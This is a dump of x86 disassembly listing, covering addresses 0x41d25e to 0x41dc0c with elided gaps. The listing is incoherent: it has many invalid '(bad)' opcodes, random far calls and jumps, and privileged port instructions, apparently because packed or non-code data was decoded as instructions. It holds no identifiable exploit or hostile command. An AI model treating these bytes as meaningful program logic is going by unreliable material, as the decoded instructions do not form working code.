  41d25e:	fstp   st(7)
  41d260:	mov    es:0xf541def9,al
  41d266:	cmp    DWORD PTR [edx],ebp
  41d268:	ss scas al,BYTE PTR es:[edi]
  41d26a:	fucomp st(4)
  41d26c:	daa    
  41d26d:	mov    dl,0xa3
  41d26f:	mov    ebx,0x9b45130
  41d274:	fsub   QWORD PTR [ebp-0x3e]
  41d277:	out    0x53,al
  41d279:	div    bl
  41d27b:	or     BYTE PTR [esp+edi*1+0x55cac512],cl
  41d282:	pop    ds
  41d283:	inc    DWORD PTR [ecx]
  41d285:	js     0x41d2d5
  41d287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d288:	mov    esp,0x6a388c30
  41d28d:	push   ebx
  41d28e:	dec    esi
  41d28f:	mov    ds:0xa0c862d1,eax
  41d294:	out    0x1e,eax
  41d296:	mov    ah,ch
  41d298:	xchg   ebx,eax
  41d299:	int3   
  41d29a:	fwait
  41d29b:	js     0x41d28f
  41d29d:	add    eax,0x2d312e1e
  41d2a2:	pop    es
  41d2a3:	(bad)  
  41d2a4:	das    
  41d2a5:	pop    DWORD PTR [esi+0x71]
  41d2a8:	xchg   BYTE PTR [edx],al
  41d2aa:	enter  0xcde5,0x9e
  41d2ae:	dec    esp
  41d2af:	ss push edi
  41d2b1:	push   esi
  41d2b2:	fisub  WORD PTR [ecx]
  41d2b4:	icebp  
  41d2b5:	push   ss
  41d2b6:	pop    DWORD PTR [edi-0x6790d806]
  41d2bc:	push   ecx
  41d2bd:	adc    ebx,DWORD PTR [ecx+0x6c]
  41d2c0:	mov    al,BYTE PTR [edx+0x1]
  41d2c3:	ss jmp 0x41d2b3
  41d2c6:	jns    0x41d2db
  41d2c8:	mov    eax,ds:0xbbf5ee8b
  41d2cd:	mov    al,0x6f
  41d2cf:	jns    0x41d338
  41d2d1:	stos   DWORD PTR es:[edi],eax
  41d2d2:	lea    edx,[edi+eax*2+0x61]
  41d2d6:	dec    ebx
  41d2d7:	mov    esp,0x169c22eb
  41d2dc:	xchg   ebp,eax
  41d2dd:	in     al,dx
  41d2de:	push   0xbc8e3e9b
  41d2e3:	es js  0x41d2b5
  41d2e6:	push   ebp
  41d2e7:	xchg   ebx,eax
  41d2e8:	mov    ch,0xe1
  41d2ea:	test   al,0xe
  41d2ec:	(bad)  
  41d2ed:	leave  
  41d2ee:	sub    eax,0x9263ebb7
  41d2f3:	lds    edx,FWORD PTR [edx]
  41d2f5:	aad    0x29
  41d2f7:	les    ecx,FWORD PTR [eax]
  41d2f9:	xlat   BYTE PTR ds:[ebx]
  41d2fa:	mov    esi,0x31133ab6
  41d2ff:	sbb    DWORD PTR [ebp+0x37],edx
  41d302:	int3   
  41d303:	mov    ecx,0x5061c98
  41d308:	pop    edx
  41d309:	cdq    
  41d30a:	mov    al,0x6
  41d30c:	sub    BYTE PTR [esi+esi*2+0x5b],dh
	...
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	xchg   ebx,eax
  41d381:	aaa    
  41d382:	arpl   WORD PTR [eax+0x13668],di
  41d388:	add    al,0x1
  41d38a:	add    BYTE PTR [eax],al
  41d38c:	push   esi
  41d38d:	pop    edx
  41d38e:	mul    al
  41d390:	push   esp
  41d391:	push   eax
  41d392:	inc    ebp
  41d393:	mov    ?,WORD PTR [ebx+edx*1]
  41d396:	xchg   ecx,eax
  41d397:	push   0xffffffe5
  41d399:	sub    BYTE PTR [edx-0x65],ah
  41d39c:	dec    edx
  41d39d:	rcl    BYTE PTR [esi+0x5f],cl
  41d3a0:	and    eax,0xf9a589e8
  41d3a5:	jg     0x41d3fa
  41d3a7:	inc    ebp
  41d3a8:	push   esi
  41d3a9:	pop    ebp
  41d3aa:	enter  0x1459,0x93
  41d3ae:	xchg   ecx,eax
  41d3af:	clc    
  41d3b0:	xchg   edx,eax
  41d3b1:	lock xchg BYTE PTR [esi+0x48a297db],al
  41d3b8:	shl    BYTE PTR [ecx-0x78],0xbd
  41d3bc:	popf   
  41d3bd:	dec    edi
  41d3be:	mov    ch,0xb5
  41d3c0:	(bad)  
  41d3c2:	enter  0xe6c4,0x95
  41d3c6:	dec    ebx
  41d3c7:	and    al,0x68
  41d3c9:	sub    eax,0x65cc7ba3
  41d3ce:	sub    ah,BYTE PTR [eax-0x25]
  41d3d1:	jg     0x41d3ba
  41d3d3:	pop    es
  41d3d4:	rcr    BYTE PTR [ecx+eax*1+0x1d],0x6a
  41d3d9:	retf   0xbf0d
  41d3dc:	or     al,0x12
  41d3de:	lds    edi,FWORD PTR [edx+0x41cbf27d]
  41d3e4:	imul   edx,DWORD PTR [edi],0x29bee06e
  41d3ea:	inc    edi
  41d3eb:	dec    edx
  41d3ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3ee:	mov    eax,esp
  41d3f0:	shl    DWORD PTR [edx],0xdf
  41d3f3:	cmp    esi,ebp
  41d3f5:	iret   
  41d3f6:	pop    ss
  41d3f7:	iret   
  41d3f8:	jmp    DWORD PTR [ecx+edi*2+0x6342ad86]
  41d3ff:	sbb    BYTE PTR [ecx-0x7eeb83ff],ch
  41d405:	das    
  41d406:	pop    ebp
  41d407:	pop    edx
  41d408:	dec    ebp
  41d409:	sub    eax,0x1e51a1d0
  41d40e:	mov    bh,0x10
  41d410:	daa    
  41d411:	hlt    
  41d412:	mov    ebx,esi
  41d414:	call   0x98a446ef
  41d419:	inc    bh
  41d41b:	xchg   esi,eax
  41d41c:	pushf  
  41d41d:	jmp    0xb2a9339b
  41d422:	(bad)  
  41d423:	push   edi
  41d424:	rol    BYTE PTR [esi+0x3e],cl
  41d427:	push   edx
  41d428:	pop    ds
  41d429:	inc    ebp
  41d42a:	adc    al,0x18
  41d42c:	cmp    al,dl
  41d42e:	mov    esi,0xece29db4
  41d433:	popa   
  41d434:	inc    edi
  41d435:	dec    ecx
  41d436:	sbb    eax,0x6dd2287e
  41d43b:	sets   BYTE PTR [ebp+0x3e7ace4c]
  41d442:	inc    esp
  41d443:	lock jge 0x41d4bb
  41d446:	xchg   ebx,eax
  41d447:	shl    dl,1
  41d449:	xchg   ecx,eax
  41d44a:	mov    eax,0x9e0d3132
  41d44f:	jne    0x41d430
  41d451:	fadd   QWORD PTR [edi+0x433851e1]
  41d457:	loop   0x41d4aa
  41d459:	xchg   ecx,eax
  41d45a:	test   eax,eax
  41d45c:	arpl   WORD PTR [edx+edx*1+0x51856e15],ax
  41d463:	pop    esp
  41d464:	or     DWORD PTR [ebx-0x3d],eax
  41d467:	pushf  
  41d468:	mov    esi,0x8f72e4a
  41d46d:	clc    
  41d46e:	shl    BYTE PTR [ebx+edx*2-0x17],1
  41d472:	ins    DWORD PTR es:[edi],dx
  41d473:	mov    WORD PTR [ecx],?
  41d475:	adc    bh,dl
  41d477:	pushf  
  41d478:	sbb    esi,DWORD PTR [eax-0x72]
  41d47b:	imul   ebp,DWORD PTR [eax+0xa],0xfe056df3
  41d482:	mov    cl,0x75
  41d484:	sar    al,cl
  41d486:	jne    0x41d4d6
  41d488:	mov    bh,BYTE PTR [ebx+0x3ac9fc02]
  41d48e:	mov    al,ds:0x8d
	...
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6cd7:0xc62b89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	jmp    0xfd5e0fb2
  41d511:	or     al,BYTE PTR [edi-0x5b]
  41d514:	fdivr  DWORD PTR [ebp+0x2c]
  41d517:	mov    dl,0xcc
  41d519:	inc    eax
  41d51a:	pop    ebx
  41d51b:	loop   0x41d4bf
  41d51d:	push   ecx
  41d51e:	pop    edx
  41d51f:	std    
  41d520:	sub    DWORD PTR [ebp-0x42e6a22e],0x57
  41d527:	daa    
  41d528:	cmp    bh,bl
  41d52a:	or     DWORD PTR [ecx],ebp
  41d52c:	cld    
  41d52d:	and    edi,DWORD PTR [ecx+edx*8+0x188e93a3]
  41d534:	frstor [ecx+0x37a7a364]
  41d53a:	arpl   WORD PTR [eax-0x40d57ab1],bx
  41d540:	les    eax,FWORD PTR [ebp+0x4260f118]
  41d546:	loopne 0x41d583
  41d548:	sti    
  41d549:	nop
  41d54a:	mov    bl,0x10
  41d54c:	push   0x895f4e5a
  41d551:	aaa    
  41d552:	xchg   ebx,eax
  41d553:	jbe    0x41d54a
  41d555:	dec    edi
  41d556:	jmp    DWORD PTR [ecx]
  41d558:	mov    edi,DWORD PTR [ecx+0x3aa017ac]
  41d55e:	call   0xd24:0xaef60953
  41d565:	jmp    0x41d57b
  41d567:	add    eax,0xcf3e8563
  41d56c:	cs dec eax
  41d56e:	pop    ebp
  41d56f:	xchg   edx,eax
  41d570:	outs   dx,DWORD PTR ds:[esi]
  41d571:	cmp    DWORD PTR [ebp+0xe],ebp
  41d574:	jecxz  0x41d5a5
  41d576:	xchg   edi,eax
  41d577:	pop    ebx
  41d578:	pop    edi
  41d579:	add    dl,ah
  41d57b:	ins    BYTE PTR es:[edi],dx
  41d57c:	sbb    ecx,0xd06bead
  41d582:	scas   eax,DWORD PTR es:[edi]
  41d583:	aaa    
  41d584:	frstor [ecx+ebp*8]
  41d587:	sub    esp,eax
  41d589:	cmc    
  41d58a:	pop    es
  41d58b:	and    DWORD PTR [ebx-0x33],ebp
  41d58e:	dec    esp
  41d58f:	adc    esi,DWORD PTR [eax]
  41d591:	and    BYTE PTR [ebx-0x3f],ch
  41d594:	sbb    DWORD PTR cs:[edx-0x33],esi
  41d598:	retf   
  41d599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d59a:	imul   ecx,DWORD PTR es:[ebx+edx*1],0x4874d4c1
  41d5a2:	add    eax,0x3df59780
  41d5a7:	or     ah,al
  41d5a9:	loopne 0x41d5b0
  41d5ab:	sbb    al,0x88
  41d5ad:	xchg   esp,eax
  41d5ae:	xchg   BYTE PTR [ebx],al
  41d5b0:	push   ebx
  41d5b1:	in     eax,dx
  41d5b2:	(bad)  
  41d5b3:	iret   
  41d5b4:	xor    edi,DWORD PTR [edx-0x32a0c91d]
  41d5ba:	xor    bl,BYTE PTR [eax]
  41d5bc:	fs dec edi
  41d5be:	adc    DWORD PTR [edx-0x53278bec],esi
  41d5c4:	es in  al,0x4e
  41d5c7:	sbb    DWORD PTR [eax],0xc081cfe8
  41d5cd:	mov    edx,0x94981ed3
  41d5d2:	push   ecx
  41d5d3:	cmp    eax,0x6328a815
  41d5d8:	enter  0xa444,0xa3
  41d5dc:	add    eax,0x87533707
  41d5e1:	dec    ebp
  41d5e2:	gs cwde 
  41d5e4:	ins    BYTE PTR es:[edi],dx
  41d5e5:	jecxz  0x41d61d
  41d5e7:	sbb    eax,0x60
  41d5ea:	cmp    al,0x40
  41d5ec:	adc    al,0x5a
  41d5ee:	cmp    BYTE PTR [esi+0x3ecab2bc],0x5c
  41d5f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5f6:	in     al,0xf5
  41d5f8:	xor    al,0x11
  41d5fa:	xchg   edx,eax
  41d5fb:	repz push 0xffffffe3
  41d5fe:	push   edx
  41d5ff:	fadd   st,st(3)
  41d601:	int3   
  41d602:	loope  0x41d636
  41d604:	inc    esi
  41d605:	nop
  41d606:	(bad)  
  41d608:	fsub   DWORD PTR [ecx]
  41d60a:	test   DWORD PTR [ebx],ecx
  41d60c:	(bad)  
  41d60d:	and    al,BYTE PTR [edi]
  41d60f:	or     DWORD PTR [eax],eax
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0xe766e435
  41d681:	test   eax,0x38707376
  41d686:	add    DWORD PTR [eax],eax
  41d688:	add    al,0x1
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	pusha  
  41d68d:	mov    edx,0x1893ed7
  41d692:	jmp    0x41d680
  41d694:	lahf   
  41d695:	jbe    0x41d690
  41d697:	push   ds
  41d698:	and    BYTE PTR [ebx],dh
  41d69a:	call   0x1ae186c0
  41d69f:	jae    0x41d6bf
  41d6a1:	adc    bh,BYTE PTR [ebp+0x74]
  41d6a4:	jae    0x41d687
  41d6a6:	mov    ds:0x3fae3960,al
  41d6ab:	xor    DWORD PTR [esi+0x49],ebx
  41d6ae:	and    BYTE PTR [ebp+0x62e4feae],0xc3
  41d6b5:	cmp    al,0x8e
  41d6b7:	push   edi
  41d6b8:	out    dx,eax
  41d6b9:	das    
  41d6ba:	mov    ch,0x82
  41d6bc:	push   ebx
  41d6bd:	sbb    ch,bl
  41d6bf:	sahf   
  41d6c0:	xlat   BYTE PTR ds:[ebx]
  41d6c1:	pop    esp
  41d6c2:	lods   eax,DWORD PTR ds:[esi]
  41d6c3:	push   ecx
  41d6c4:	xchg   ebx,eax
  41d6c5:	cmp    esp,edi
  41d6c7:	je     0x41d6bf
  41d6c9:	das    
  41d6ca:	xchg   esp,eax
  41d6cb:	pop    esi
  41d6cc:	xor    DWORD PTR [ebp+0x5c77ff5c],ecx
  41d6d2:	clc    
  41d6d3:	daa    
  41d6d4:	inc    esi
  41d6d5:	jmp    0x41d666
  41d6d7:	adc    ebp,0xfffffff9
  41d6da:	jl     0x41d71a
  41d6dc:	mov    ?,WORD PTR [eax]
  41d6de:	ss retf 0xc7d5
  41d6e2:	xchg   ecx,eax
  41d6e3:	push   edx
  41d6e4:	aad    0x57
  41d6e6:	shl    ebx,1
  41d6e8:	rol    BYTE PTR [edx],1
  41d6ea:	xchg   BYTE PTR [edi+0x7d],dh
  41d6ed:	lods   al,BYTE PTR ds:[esi]
  41d6ee:	out    0x93,al
  41d6f0:	test   DWORD PTR [edx-0x69],0xbff72628
  41d6f7:	sbb    BYTE PTR [ebp-0x3d],al
  41d6fa:	aad    0x12
  41d6fc:	xchg   esp,eax
  41d6fd:	and    DWORD PTR [ecx+edx*2-0x6d250141],edi
  41d704:	mov    BYTE PTR gs:[ecx+eiz*4],ah
  41d708:	nop
  41d709:	arpl   WORD PTR [ecx+0x707e51c3],ax
  41d70f:	stos   BYTE PTR es:[edi],al
  41d710:	cmp    eax,0x2542e961
  41d715:	fs xchg ebp,eax
  41d717:	outs   dx,DWORD PTR ds:[esi]
  41d718:	push   ss
  41d719:	sub    DWORD PTR [edx-0x38],ebp
  41d71c:	mov    eax,ds:0x723a5df6
  41d721:	das    
  41d722:	inc    esi
  41d723:	pop    ss
  41d724:	cld    
  41d725:	add    esi,DWORD PTR [ecx]
  41d727:	bound  esi,QWORD PTR ds:0x44fbd667
  41d72d:	sub    ebx,edx
  41d72f:	rcl    BYTE PTR ds:0xf057c396,0xc8
  41d736:	cmp    eax,0x8293e971
  41d73b:	mov    bh,0x32
  41d73d:	int3   
  41d73e:	call   0xa047:0x5bf95b20
  41d745:	pop    eax
  41d746:	scas   eax,DWORD PTR es:[edi]
  41d747:	and    edi,edi
  41d749:	cmp    ch,BYTE PTR [ecx+edi*2+0x47]
  41d74d:	add    BYTE PTR [edx],dh
  41d74f:	cmc    
  41d750:	jecxz  0x41d77b
  41d752:	into   
  41d753:	push   edx
  41d754:	sub    edx,DWORD PTR [ecx]
  41d756:	mov    ds:0x89ddc849,al
  41d75b:	add    eax,0xdb0e7689
  41d760:	pop    edi
  41d761:	outs   dx,DWORD PTR ds:[esi]
  41d762:	ins    BYTE PTR es:[edi],dx
  41d763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d764:	cmp    eax,0x6b8a2567
  41d769:	push   ds
  41d76a:	mov    ecx,0x778861a7
  41d76f:	les    ecx,FWORD PTR [ecx+ecx*8-0x3e9c2a8e]
  41d776:	mov    esp,0x473692a5
  41d77b:	jne    0x41d717
  41d77d:	xchg   ebp,eax
  41d77e:	ret    
  41d77f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d780:	mov    cl,0xb5
  41d782:	dec    ecx
  41d783:	mov    bh,0x5c
  41d785:	ja     0x41d7db
  41d787:	xor    eax,ebx
  41d789:	jnp    0x41d78b
  41d78b:	sbb    al,0xa2
  41d78d:	inc    edi
  41d78e:	lock popa 
	...
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	shr    BYTE PTR [edi+eax*1],1
  41d803:	call   0x104:0x13974
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	push   cs
  41d80d:	fisub  WORD PTR [esi+eiz*2-0x50]
  41d811:	test   ebx,ebx
  41d813:	xchg   BYTE PTR [eax+0x5687634d],ch
  41d819:	data16 sbb al,0x55
  41d81c:	sbb    ebp,ecx
  41d81e:	fstp   TBYTE PTR [ecx-0x2c]
  41d821:	mov    bh,dl
  41d823:	jecxz  0x41d7a5
  41d825:	imul   esp,DWORD PTR [edx],0xffffffcb
  41d828:	push   ss
  41d829:	loopne 0x41d840
  41d82b:	das    
  41d82c:	xchg   ebp,eax
  41d82d:	pop    esp
  41d82e:	cwde   
  41d82f:	jns    0x41d7bf
  41d831:	repz cmp BYTE PTR ss:[ebp+0x35],0x4
  41d837:	add    eax,0x5db70225
  41d83c:	cmp    al,0xdf
  41d83e:	stc    
  41d83f:	test   BYTE PTR [ecx+0x750c586],bl
  41d845:	pushf  
  41d846:	push   edx
  41d847:	adc    ah,BYTE PTR [eax+0x74]
  41d84a:	mov    ?,edx
  41d84c:	addr16 (bad) 
  41d84e:	leave  
  41d84f:	gs jmp 0x41d819
  41d852:	daa    
  41d853:	pop    ecx
  41d854:	jecxz  0x41d823
  41d856:	adc    DWORD PTR [ebx+0x2cdb80f8],eax
  41d85c:	cli    
  41d85d:	repnz or edi,DWORD PTR gs:[edi+0x1a]
  41d862:	cmp    eax,0xa53d3b5d
  41d867:	mov    dh,0xe7
  41d869:	jnp    0x41d83c
  41d86b:	sbb    BYTE PTR [ebx],bh
  41d86d:	call   0xe152:0xd1150c65
  41d874:	arpl   ax,dx
  41d876:	xchg   ebx,eax
  41d877:	int    0x0
  41d879:	adc    al,0xcb
  41d87b:	in     al,dx
  41d87c:	imul   ecx,DWORD PTR [eax],0xffffffe9
  41d87f:	cdq    
  41d880:	and    dh,ch
  41d882:	imul   edi,DWORD PTR [esi+0x0],0x84e9d301
  41d889:	or     ebp,DWORD PTR [eax-0x1a]
  41d88c:	pop    ecx
  41d88d:	mov    esi,0x30bad3c9
  41d892:	inc    ecx
  41d893:	add    al,0x9b
  41d895:	inc    ecx
  41d896:	jmp    0x41d8c8
  41d898:	jmp    0x41d8d4
  41d89a:	je     0x41d82a
  41d89c:	push   ss
  41d89d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d89e:	call   FWORD PTR [ecx-0x7dfd1df6]
  41d8a4:	cmp    al,0xbb
  41d8a6:	jns    0x41d8fa
  41d8a8:	jmp    0x41d82b
  41d8aa:	cmc    
  41d8ab:	ror    DWORD PTR [esi-0x3a9e5cf8],cl
  41d8b1:	sbb    al,0xdb
  41d8b3:	xor    bh,cl
  41d8b5:	pop    esi
  41d8b6:	pop    ebx
  41d8b7:	mov    ss,ebp
  41d8b9:	bound  edx,QWORD PTR [eax+0x543ff24d]
  41d8bf:	aam    0x7a
  41d8c1:	inc    ebp
  41d8c2:	clc    
  41d8c3:	int3   
  41d8c4:	out    0xb,al
  41d8c6:	ss aad 0x9f
  41d8c9:	jmp    0xd4396afe
  41d8ce:	loope  0x41d912
  41d8d0:	push   eax
  41d8d1:	add    eax,0x3e0d139d
  41d8d6:	popa   
  41d8d7:	pop    ebp
  41d8d8:	call   0xc6bf:0x3e9e8dda
  41d8df:	adc    bh,dl
  41d8e1:	mov    bh,0xd4
  41d8e3:	scas   al,BYTE PTR es:[edi]
  41d8e4:	mov    dl,0x84
  41d8e6:	mov    ?,WORD PTR [eax-0x3a9dbb4c]
  41d8ec:	jmp    0x2a2131ee
  41d8f1:	inc    esp
  41d8f2:	push   edx
  41d8f3:	pop    ebp
  41d8f4:	push   edi
  41d8f5:	jmp    0x2b99:0x657600d4
  41d8fc:	xor    cl,BYTE PTR ds:0x8941f9f6
  41d902:	sub    dl,BYTE PTR [edi+0x241d5d9f]
  41d908:	retf   
  41d909:	test   al,0x4b
  41d90b:	or     BYTE PTR [esi+0x46],cl
  41d90e:	popf   
  41d90f:	push   cs
	...
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs cmp al,0x42
  41d982:	iret   
  41d983:	ja     0x41d9fd
  41d985:	cmp    al,BYTE PTR [ecx]
  41d987:	add    BYTE PTR [ecx+eax*1],al
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	rcr    BYTE PTR [eax-0x5c],0xdd
  41d990:	sub    eax,0xe1db4d7
  41d995:	cs pop es
  41d997:	ret    0xadb9
  41d99a:	add    dh,dl
  41d99c:	loopne 0x41d97c
  41d99e:	cs std 
  41d9a0:	inc    ecx
  41d9a1:	xchg   ecx,eax
  41d9a2:	out    dx,eax
  41d9a3:	sbb    ebp,edi
  41d9a5:	sub    eax,0x6fa86040
  41d9aa:	sub    DWORD PTR [ebp-0x70519f81],ecx
  41d9b0:	(bad)  
  41d9b1:	push   edi
  41d9b2:	and    ecx,eax
  41d9b4:	pop    ecx
  41d9b5:	mov    dh,0x27
  41d9b7:	sar    BYTE PTR [edx+0x14f182d1],cl
  41d9bd:	cmp    esp,DWORD PTR [ebx+0x2c8a1198]
  41d9c3:	dec    edi
  41d9c4:	dec    esi
  41d9c5:	push   cs
  41d9c6:	mov    edi,0xaee02f35
  41d9cb:	pop    esp
  41d9cc:	int3   
  41d9cd:	xchg   ecx,eax
  41d9ce:	lods   al,BYTE PTR ds:[esi]
  41d9cf:	mov    edx,0x3b343f1b
  41d9d4:	add    BYTE PTR [ebp+0x432e18ec],al
  41d9da:	xchg   ecx,eax
  41d9db:	sbb    al,0x20
  41d9dd:	je     0x41da4c
  41d9df:	sub    DWORD PTR [esi+0x1b],0x78c3bef1
  41d9e6:	int    0xfc
  41d9e8:	jns    0x41da5f
  41d9ea:	dec    ebx
  41d9eb:	icebp  
  41d9ec:	mov    esi,0x5d599210
  41d9f1:	mov    edi,0x856afc50
  41d9f6:	mov    dh,BYTE PTR [ebx+esi*4+0x9]
  41d9fa:	inc    cl
  41d9fc:	in     eax,0xcd
  41d9fe:	call   0x706e:0x92790d9f
  41da05:	jp     0x41d9cc
  41da07:	mov    edx,0xba4d2089
  41da0c:	jle    0x41d9d0
  41da0e:	(bad)  
  41da0f:	fnstenv es:[ecx+0x551a0685]
  41da16:	cmp    al,0xb7
  41da18:	ds mov ecx,0xd5d2d5d
  41da1e:	sub    DWORD PTR [edx-0x75a39666],esi
  41da24:	add    DWORD PTR [ecx+0x6c],esp
  41da27:	push   esp
  41da28:	and    DWORD PTR [ecx-0x78a06439],esp
  41da2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da2f:	mov    al,ds:0xf4a44dec
  41da34:	repz fldcw WORD PTR gs:[eax-0x70]
  41da39:	fstp   DWORD PTR [eax+esi*8-0x39]
  41da3d:	int    0xd
  41da3f:	das    
  41da40:	sbb    dh,bh
  41da42:	popa   
  41da43:	add    ebp,DWORD PTR [esi+0x17f96d48]
  41da49:	xchg   ebp,eax
  41da4a:	scas   eax,DWORD PTR es:[edi]
  41da4b:	adc    bl,ch
  41da4d:	cs inc eax
  41da4f:	(bad)  
  41da50:	lea    ebx,[ebx]
  41da52:	gs (bad) 
  41da54:	iret   
  41da55:	loopne 0x41da29
  41da57:	sbb    cl,BYTE PTR [ecx]
  41da59:	or     DWORD PTR [edx],edx
  41da5b:	jle    0x41da80
  41da5d:	jmp    0x41da2d
  41da5f:	xchg   edi,eax
  41da60:	in     al,dx
  41da61:	cmp    al,0xb2
  41da63:	mov    ds:0xa6e002b5,eax
  41da68:	js     0x41dabe
  41da6a:	ret    0x8c70
  41da6d:	mov    cl,0xa
  41da6f:	mov    ebx,gs
  41da71:	in     al,0xd0
  41da73:	mov    eax,0xef077baf
  41da78:	sti    
  41da79:	adc    bl,BYTE PTR [edx-0x10]
  41da7c:	lock push esi
  41da7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da7f:	loop   0x41dabf
  41da81:	or     eax,0x87c4c0fb
  41da86:	push   cs
  41da87:	xlat   BYTE PTR ds:[ebx]
  41da88:	pop    ds
  41da89:	and    BYTE PTR [eax],cl
  41da8b:	pop    edx
  41da8c:	inc    BYTE PTR [edi+0xe]
  41da8f:	push   ecx
	...
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xfffffffa
  41db01:	mov    edi,0x3b7cbbf5
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    al,0x1
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	loopne 0x41db56
  41db0e:	rcl    DWORD PTR [eax],1
  41db10:	inc    edx
  41db11:	retf   0x50ac
  41db14:	and    al,bl
  41db16:	add    eax,0x65bd4bd1
  41db1b:	inc    ecx
  41db1c:	cli    
  41db1d:	push   edx
  41db1e:	pop    ds
  41db1f:	scas   al,BYTE PTR es:[edi]
  41db20:	pop    ds
  41db21:	mov    ebx,0x3b414aaa
  41db26:	out    0xb6,eax
  41db28:	dec    ecx
  41db29:	inc    edx
  41db2a:	(bad)  
  41db2b:	mov    ch,0xe9
  41db2d:	(bad)  
  41db2f:	iret   
  41db30:	iret   
  41db31:	add    eax,0x952665c7
  41db36:	pop    edx
  41db37:	je     0x41db01
  41db39:	es dec ebx
  41db3b:	pop    edi
  41db3c:	sbb    eax,0xf5209b0
  41db41:	out    0xea,eax
  41db43:	cld    
  41db44:	xchg   ecx,eax
  41db45:	add    ecx,DWORD PTR [ecx+0x10]
  41db48:	out    dx,al
  41db49:	xchg   ebp,eax
  41db4a:	aas    
  41db4b:	out    0x5d,eax
  41db4d:	mov    ds:0xfed0153a,eax
  41db52:	xchg   BYTE PTR [esi-0x47],al
  41db55:	in     al,0xd
  41db57:	push   ebp
  41db58:	and    edx,DWORD PTR [ebp-0x7d]
  41db5b:	ret    0x887c
  41db5e:	test   BYTE PTR [esp+eax*1-0x4fdabd18],0x86
  41db66:	pop    ebp
  41db67:	stos   BYTE PTR es:[edi],al
  41db68:	push   esi
  41db69:	nop
  41db6a:	scas   al,BYTE PTR es:[edi]
  41db6b:	mov    dh,0xf4
  41db6d:	loop   0x41dbc2
  41db6f:	rol    DWORD PTR [eax+0x2c],1
  41db72:	sbb    eax,0x5f4527eb
  41db77:	xchg   esi,eax
  41db78:	mov    cl,0x7a
  41db7a:	(bad)  
  41db7b:	jmp    0x52a5646c
  41db80:	pop    edx
  41db81:	loop   0x41dbb3
  41db83:	mov    ah,0x19
  41db85:	inc    ecx
  41db86:	(bad)  
  41db87:	mov    WORD PTR [edi-0x1de47f29],es
  41db8d:	enter  0x72ac,0xee
  41db91:	push   ds
  41db92:	jmp    0x4b691e83
  41db97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db98:	mov    ch,BYTE PTR [edi+0x5a27f41b]
  41db9e:	test   BYTE PTR [ecx],ah
  41dba0:	fisttp QWORD PTR [esi+0x1c]
  41dba3:	(bad)  
  41dba4:	push   esi
  41dba5:	fimul  WORD PTR [bp-0x943]
  41dbaa:	dec    BYTE PTR [ebx+0x3]
  41dbad:	xchg   esp,eax
  41dbae:	test   BYTE PTR [esp+eax*2+0x1b208b86],cl
  41dbb5:	cbw    
  41dbb7:	(bad)  
  41dbb9:	mov    BYTE PTR [edi+0x69],dl
  41dbbc:	clc    
  41dbbd:	or     al,0x72
  41dbbf:	and    al,0x17
  41dbc1:	test   BYTE PTR [edi+0x6c86cb1b],dh
  41dbc7:	xor    eax,0x2463fe48
  41dbcc:	sbb    ah,cl
  41dbce:	xchg   edx,eax
  41dbcf:	into   
  41dbd0:	sub    al,0x7e
  41dbd2:	lds    esi,FWORD PTR [edi]
  41dbd4:	pop    ss
  41dbd5:	dec    esp
  41dbd6:	pop    ebp
  41dbd7:	aam    0x1a
  41dbd9:	mov    bl,0xcc
  41dbdb:	xor    edi,ecx
  41dbdd:	cmp    al,BYTE PTR ds:0x120ca960
  41dbe3:	push   esp
  41dbe4:	sub    BYTE PTR [edx],dh
  41dbe6:	pop    edi
  41dbe7:	test   eax,0xd44de48c
  41dbec:	pop    esi
  41dbed:	clc    
  41dbee:	adc    eax,0xa12ff7e5
  41dbf3:	mov    es,WORD PTR [ebx-0x5]
  41dbf6:	bound  ebp,QWORD PTR [eax]
  41dbf8:	sbb    DWORD PTR [ebp-0x7427f73b],esp
  41dbfe:	sahf   
  41dbff:	(bad)  
  41dc00:	nop
  41dc01:	xchg   BYTE PTR [ebx+esi*4+0x67],ch
  41dc05:	mov    cl,0x84
  41dc07:	outs   dx,BYTE PTR ds:[esi]
  41dc08:	pop    esp
  41dc09:	shl    DWORD PTR [ebx],0x12
  41dc0c:	sahf   
